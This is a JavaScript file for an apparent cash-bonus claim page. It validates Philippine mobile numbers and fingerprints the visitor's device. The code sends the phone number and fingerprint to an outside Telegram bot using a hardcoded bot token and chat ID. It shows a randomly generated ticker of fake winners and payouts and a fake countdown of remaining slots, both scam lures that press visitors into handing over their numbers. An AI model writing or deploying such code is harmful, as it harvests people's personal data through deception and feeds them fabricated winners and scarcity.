/**
 * Index.js - Main Script for index.html
 * Handles: User Registration, Phone Validation, Device Fingerprint, Redirect to PlayBonus
 */

(function() {
    'use strict';
    
    // ========== CONFIGURATION ==========
    var botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
    var chatId = '7298607329';
    
    // ========== DOM ELEMENTS ==========
    var userPhoneInput = document.getElementById('userPhone');
    var claimBtn = document.getElementById('claimBtn');
    var modalOverlay = document.getElementById('modalOverlay');
    var mainCard = document.getElementById('mainCard');
    var winnerEntry = document.getElementById('winnerEntry');
    var remNum = document.getElementById('remNum');
    var pBar = document.getElementById('pBar');
    
    // ========== SWIPE ELEMENTS ==========
    var swipeTrack = document.getElementById('swipeTrack');
    var swipeIcon = document.getElementById('swipeIcon');
    var swipeFireTrail = document.getElementById('swipeFireTrail');
    
    // ========== SCARCITY COUNTER ==========
    var count = 88;
    
    // ========== FIREBASE ==========
    var db = null;
    
    // ========== PHONE VALIDATION ==========
    function isValidPhoneNumber(phone) {
        var cleaned = phone.replace(/\D/g, '');
        return cleaned.length === 11 && cleaned.startsWith('09');
    }
    
    function formatPhoneNumber(phone) {
        var cleaned = phone.replace(/\D/g, '');
        if (cleaned.length === 11 && cleaned.startsWith('09')) {
            return cleaned;
        }
        if (cleaned.length === 10 && cleaned.startsWith('9')) {
            return '0' + cleaned;
        }
        return cleaned;
    }
    
    // ========== DEVICE FINGERPRINT ==========
    function getDeviceFingerprint() {
        var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var language = navigator.language;
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
        var deviceMemory = navigator.deviceMemory || 'unknown';
        
        var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency + '|' + deviceMemory;
        
        var hash = 0;
        for (var i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return 'FP_' + Math.abs(hash);
    }
    
    // ========== GET DEVICE DISPLAY ID ==========
    function getOrCreateDeviceId(fingerprint) {
        if (!fingerprint || fingerprint === '---') return Promise.resolve('---');
        
        var deviceMapRef = db.ref('device_id_map/' + fingerprint);
        return deviceMapRef.once('value').then(function(snap) {
            if (snap.exists()) {
                return snap.val().displayId;
            }
            
            var counterRef = db.ref('admin/deviceCounter');
            return counterRef.once('value').then(function(counterSnap) {
                var nextNum = (counterSnap.val() || 0) + 1;
                return counterRef.set(nextNum).then(function() {
                    var displayId = 'Dev' + nextNum;
                    return deviceMapRef.set({
                        displayId: displayId,
                        createdAt: Date.now(),
                        fingerprint: fingerprint
                    }).then(function() {
                        return displayId;
                    });
                });
            });
        });
    }
    
    // ========== SAVE DEVICE INFO ==========
    function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
        var deviceInfo = {
            phone: phone,
            fingerprint: fingerprint,
            displayId: deviceDisplayId,
            screenResolution: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            lastSeen: Date.now(),
            firstSeen: Date.now()
        };
        
        return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
            if (!existingDevice.exists()) {
                return db.ref('devices/' + fingerprint).set(deviceInfo);
            } else {
                return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
            }
        }).then(function() {
            return db.ref('device_phone_map/' + fingerprint).set({
                phone: phone,
                displayId: deviceDisplayId,
                lastSeen: Date.now()
            });
        });
    }
    
    // ========== GENERATE REFERRAL CODE ==========
    function generateReferralCode() {
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        var code = '';
        for (var i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }
    
    // ========== CREATE USER SESSION ==========
    function createUserSession(phone, fingerprint, deviceDisplayId) {
        var sessionRef = db.ref('user_sessions/' + phone);
        
        return sessionRef.once('value').then(function(sessionSnap) {
            if (!sessionSnap.exists()) {
                var initialCode = generateReferralCode();
                
                return sessionRef.set({
                    phone: phone,
                    balance: 0,
                    clicks: 0,
                    status: 'online',
                    deviceFingerprint: fingerprint,
                    deviceDisplayId: deviceDisplayId,
                    lastUpdate: Date.now(),
                    createdAt: Date.now(),
                    referral_code: initialCode,
                    referral_code_generated_at: Date.now(),
                    claimed_luckycat: false,
                    claimed_ptcat: false
                });
            } else {
                var data = sessionSnap.val();
                return sessionRef.update({
                    status: 'online',
                    lastUpdate: Date.now(),
                    deviceFingerprint: fingerprint,
                    deviceDisplayId: deviceDisplayId
                }).then(function() {
                    if (!data.referral_code) {
                        var newCode = generateReferralCode();
                        return sessionRef.child('referral_code').set(newCode)
                            .then(function() {
                                return sessionRef.child('referral_code_generated_at').set(Date.now());
                            });
                    }
                });
            }
        });
    }
    
    // ========== SET USER ONLINE ==========
    function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
        return db.ref('user_sessions/' + phoneNumber).update({
            status: 'online',
            lastSeen: firebase.database.ServerValue.TIMESTAMP,
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
    }
    
    // ========== BAN CHECK ==========
    function isPhoneBanned(phone) {
        return db.ref('banned_ghosts/' + phone).once('value').then(function(snap) {
            return snap.exists();
        });
    }
    
    function isFingerprintLinkedToBanned(fingerprint) {
        return db.ref('device_phone_map/' + fingerprint).once('value').then(function(snap) {
            if (snap.exists()) {
                var linkedPhone = snap.val().phone;
                return isPhoneBanned(linkedPhone);
            }
            return false;
        });
    }
    
    function getBanDetails(phone, fingerprint) {
        return isPhoneBanned(phone).then(function(phoneBanned) {
            if (phoneBanned) {
                return { isBanned: true, type: "phone" };
            }
            return isFingerprintLinkedToBanned(fingerprint).then(function(fpBanned) {
                if (fpBanned) {
                    return { isBanned: true, type: "device" };
                }
                return { isBanned: false };
            });
        });
    }
    
    // ========== NUMBER CLAIMED CHECK ==========
    function isNumberClaimed(phone) {
        return db.ref('user_logs/' + phone).once('value').then(function(logSnap) {
            return (logSnap.exists() && logSnap.val().status === 'claimed');
        });
    }
    
    // ========== SHOW BLOCKED UI ==========
    function showBlockedUI(reason) {
        if (!modalOverlay) return;
        modalOverlay.style.display = 'flex';
        
        var title = "ACCESS RESTRICTED";
        var blockMessage = "This account has been restricted by the administrator.";
        
        if (reason === "claimed") {
            title = "ALREADY CLAIMED";
            blockMessage = "This number has already claimed a reward before.";
        }
        
        var modalBody = document.getElementById('modalBodyContent');
        if (modalBody) {
            modalBody.innerHTML = 
                '<div class="bonus-box-premium">' +
                    '<div class="bonus-amount-premium">🚫</div>' +
                '</div>' +
                '<h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">' + title + '</h3>' +
                '<p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">' + blockMessage + '</p>' +
                '<button class="login-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>';
        }
        if (mainCard) mainCard.style.opacity = "0.3";
    }
    
    // ========== PROCESS STEP 1 (Main Flow) ==========
    function processStep1() {
        if (!userPhoneInput || !claimBtn) return;
        
        var rawPhone = userPhoneInput.value.trim();
        var fingerprint = getDeviceFingerprint();
        
        if (!rawPhone || rawPhone.length === 0) {
            alert("Please enter your mobile number.");
            return;
        }
        
        var fullPhone = formatPhoneNumber(rawPhone);
        
        if (!isValidPhoneNumber(fullPhone)) {
            alert("Invalid mobile number.\n\nPlease enter a valid 11-digit number starting with 09 (e.g., 09123456789)");
            return;
        }
        
        claimBtn.classList.add('loading');
        claimBtn.disabled = true;
        
        getBanDetails(fullPhone, fingerprint).then(function(banDetails) {
            if (banDetails.isBanned) {
                claimBtn.classList.remove('loading');
                claimBtn.disabled = false;
                showBlockedUI("banned");
                return;
            }
            
            return isNumberClaimed(fullPhone).then(function(isClaimed) {
                if (isClaimed) {
                    claimBtn.classList.remove('loading');
                    claimBtn.disabled = false;
                    showBlockedUI("claimed");
                    return;
                }
                
                return getOrCreateDeviceId(fingerprint).then(function(deviceDisplayId) {
                    return saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId).then(function() {
                        return createUserSession(fullPhone, fingerprint, deviceDisplayId).then(function() {
                            return setUserOnline(fullPhone, fingerprint, deviceDisplayId).then(function() {
                                // Send Telegram notification
                                var message = '🎁 PLAYBONUS LOGIN:\n📱 ' + fullPhone + '\n🖥️ FP: ' + fingerprint + '\n🔑 DEV#: ' + deviceDisplayId;
                                fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message))
                                    .catch(function(e) { console.log('Telegram error:', e); });
                                
                                // Save to localStorage
                                localStorage.setItem("userPhone", fullPhone);
                                localStorage.setItem("userDeviceId", fingerprint);
                                localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
                                
                                claimBtn.classList.remove('loading');
                                claimBtn.classList.add('success');
                                var loginTextSpan = claimBtn.querySelector('.login-text');
                                if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS';
                                
                                // ========== REDIRECT TO PLAYBONUS.HTML ==========
                                setTimeout(function() {
                                    window.location.href = "PlayBonus.html";
                                }, 1000);
                            });
                        });
                    });
                });
            });
        }).catch(function(error) {
            console.error("Process error:", error);
            claimBtn.classList.remove('loading');
            claimBtn.disabled = false;
            alert("An error occurred. Please try again.");
        });
    }
    
    // ========== SWIPE TO VERIFY ==========
    var isDragging = false;
    var startX = 0;
    var currentLeft = 0;
    var swipeCompleted = false;
    var trailInterval = null;
    
    function startFireTrail() {
        if (trailInterval) clearInterval(trailInterval);
        if (swipeFireTrail) {
            swipeFireTrail.classList.add('active');
            trailInterval = setInterval(function() {
                if (swipeFireTrail) {
                    swipeFireTrail.classList.remove('active');
                    setTimeout(function() {
                        if (swipeFireTrail) swipeFireTrail.classList.add('active');
                    }, 50);
                }
            }, 100);
        }
    }
    
    function stopFireTrail() {
        if (trailInterval) {
            clearInterval(trailInterval);
            trailInterval = null;
        }
        if (swipeFireTrail) {
            swipeFireTrail.classList.remove('active');
        }
    }
    
    function updateFireTrailPosition(leftPos, maxLeft) {
        if (!swipeFireTrail) return;
        var percentage = (leftPos / maxLeft) * 100;
        swipeFireTrail.style.width = percentage + '%';
    }
    
    function completeSwipe() {
        if (swipeCompleted) return;
        swipeCompleted = true;
        
        if (swipeFireTrail) {
            swipeFireTrail.style.width = '100%';
            swipeFireTrail.classList.add('active');
        }
        
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound error:', e); });
        } catch(e) {}
        
        var swipeContainer = document.querySelector('.swipe-container');
        if (swipeContainer) {
            swipeContainer.style.transition = 'opacity 0.3s ease';
            swipeContainer.style.opacity = '0';
        }
        
        setTimeout(function() {
            if (modalOverlay) modalOverlay.style.display = 'flex';
            if (swipeContainer) swipeContainer.style.display = 'none';
        }, 400);
        
        setTimeout(function() {
            if (swipeFireTrail) swipeFireTrail.classList.remove('active');
        }, 500);
    }
    
    function initSwipe() {
        if (!swipeIcon || !swipeTrack) return;
        
        var trackWidth = swipeTrack.offsetWidth;
        var iconWidth = 56;
        var maxLeft = trackWidth - iconWidth;
        
        swipeIcon.addEventListener('touchstart', function(e) {
            if (swipeCompleted) return;
            e.preventDefault();
            isDragging = true;
            startX = e.touches[0].clientX;
            currentLeft = parseInt(swipeIcon.style.left) || 0;
            swipeIcon.style.cursor = 'grabbing';
            startFireTrail();
        });
        
        swipeIcon.addEventListener('touchmove', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            var moveX = e.touches[0].clientX - startX;
            var newLeft = currentLeft + moveX;
            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
            swipeIcon.style.left = newLeft + 'px';
            updateFireTrailPosition(newLeft, maxLeft);
        });
        
        swipeIcon.addEventListener('touchend', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            isDragging = false;
            swipeIcon.style.cursor = 'grab';
            stopFireTrail();
            
            var finalLeft = parseInt(swipeIcon.style.left) || 0;
            
            if (finalLeft >= maxLeft - 10) {
                completeSwipe();
            } else {
                swipeIcon.style.left = '0px';
                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
            }
        });
        
        swipeIcon.addEventListener('mousedown', function(e) {
            if (swipeCompleted) return;
            e.preventDefault();
            isDragging = true;
            startX = e.clientX;
            currentLeft = parseInt(swipeIcon.style.left) || 0;
            swipeIcon.style.cursor = 'grabbing';
            startFireTrail();
        });
        
        window.addEventListener('mousemove', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            var moveX = e.clientX - startX;
            var newLeft = currentLeft + moveX;
            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
            swipeIcon.style.left = newLeft + 'px';
            updateFireTrailPosition(newLeft, maxLeft);
        });
        
        window.addEventListener('mouseup', function(e) {
            if (!isDragging || swipeCompleted) return;
            isDragging = false;
            swipeIcon.style.cursor = 'grab';
            stopFireTrail();
            
            var finalLeft = parseInt(swipeIcon.style.left) || 0;
            
            if (finalLeft >= maxLeft - 10) {
                completeSwipe();
            } else {
                swipeIcon.style.left = '0px';
                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
            }
        });
    }
    
    // ========== LIVE WINNERS TICKER ==========
    function updateTickerWithTransition(phoneNumber, amount, type) {
        if (!winnerEntry) return;
        
        winnerEntry.classList.remove('fade-in');
        winnerEntry.classList.add('fade-out');
        
        setTimeout(function() {
            var displayText = '';
            if (type === 'task') {
                displayText = phoneNumber + ' completed task +₱' + amount;
            } else {
                displayText = phoneNumber + ' successful referral +₱' + amount;
            }
            
            winnerEntry.innerHTML = displayText;
            winnerEntry.classList.remove('fade-out');
            winnerEntry.classList.add('fade-in');
        }, 200);
    }
    
    function startTicker() {
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        
        function generateRandomAmount() {
            var rand = Math.random() * 100;
            if (rand < 90) return 500;
            else if (rand < 105) return 1000;
            else if (rand < 115) return 1500;
            else return 2000;
        }
        
        function generateWinner() {
            var randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var randomSuffix = Math.floor(1000 + Math.random() * 9000);
            var phoneNumber = randomPrefix + '***' + randomSuffix;
            var amount = generateRandomAmount();
            var type = Math.random() < 0.7 ? 'task' : 'referral';
            return { phoneNumber: phoneNumber, amount: amount, type: type };
        }
        
        var initial = generateWinner();
        if (winnerEntry) {
            winnerEntry.innerHTML = initial.phoneNumber + ' ' + 
                (initial.type === 'task' ? 'completed task' : 'successful referral') + 
                ' +₱' + initial.amount;
            winnerEntry.classList.add('fade-in');
        }
        
        setInterval(function() {
            var winner = generateWinner();
            updateTickerWithTransition(winner.phoneNumber, winner.amount, winner.type);
        }, 4800);
    }
    
    // ========== SCARCITY COUNTER ==========
    function startScarcityCounter() {
        setInterval(function() {
            if (count > 15) {
                count -= Math.floor(Math.random() * 2) + 1;
                if (remNum) remNum.innerText = count;
                if (pBar) pBar.style.width = count + '%';
            }
        }, 5000);
    }
    
    // ========== PARTICLES EFFECT ==========
    function initParticles() {
        var canvas = document.getElementById('particleCanvas');
        if (!canvas) return;
        
        var width = window.innerWidth;
        var height = window.innerHeight;
        var particles = [];
        var ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            width = window.innerWidth;
            height = window.innerHeight;
            canvas.width = width;
            canvas.height = height;
        }
        
        function createParticles() {
            var particleCount = Math.min(40, Math.floor(width * height / 20000));
            for (var i = 0; i < particleCount; i++) {
                particles.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    size: Math.random() * 2 + 1,
                    alpha: Math.random() * 0.2 + 0.05,
                    vx: (Math.random() - 0.5) * 0.2,
                    vy: (Math.random() - 0.5) * 0.1
                });
            }
        }
        
        function animateParticles() {
            if (!ctx) return;
            ctx.clearRect(0, 0, width, height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0) p.x = width;
                if (p.x > width) p.x = 0;
                if (p.y < 0) p.y = height;
                if (p.y > height) p.y = 0;
                
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255, 215, 0, ' + p.alpha + ')';
                ctx.fill();
            }
            requestAnimationFrame(animateParticles);
        }
        
        window.addEventListener('resize', function() {
            resizeCanvas();
            particles = [];
            createParticles();
        });
        
        resizeCanvas();
        createParticles();
        animateParticles();
    }
    
    // ========== MODAL FUNCTIONS ==========
    function closeModal() {
        if (modalOverlay) modalOverlay.style.display = 'none';
    }
    
    // ========== INITIALIZE ==========
    function init() {
        // Firebase
        if (typeof firebaseConfig !== 'undefined') {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
        }
        
        initSwipe();
        startTicker();
        startScarcityCounter();
        initParticles();
        
        if (modalOverlay) {
            modalOverlay.addEventListener('click', function(e) {
                if (e.target === modalOverlay) closeModal();
            });
        }
        
        if (userPhoneInput) {
            userPhoneInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') window.processStep1();
            });
        }
        
        console.log('✅ Index page initialized');
    }
    
    // ========== EXPORT FUNCTIONS ==========
    window.processStep1 = processStep1;
    window.closeModal = closeModal;
    
    // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
    (function() {
        var existingUserPhone = localStorage.getItem("userPhone");
        var existingDeviceId = localStorage.getItem("userDeviceId");
        
        if (existingUserPhone && 
            existingUserPhone !== 'null' && 
            existingUserPhone !== 'undefined' && 
            existingUserPhone.length > 5) {
            console.log('Existing user detected:', existingUserPhone);
            console.log('Redirecting to PlayBonus.html...');
            window.location.href = "PlayBonus.html";
        }
    })();
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
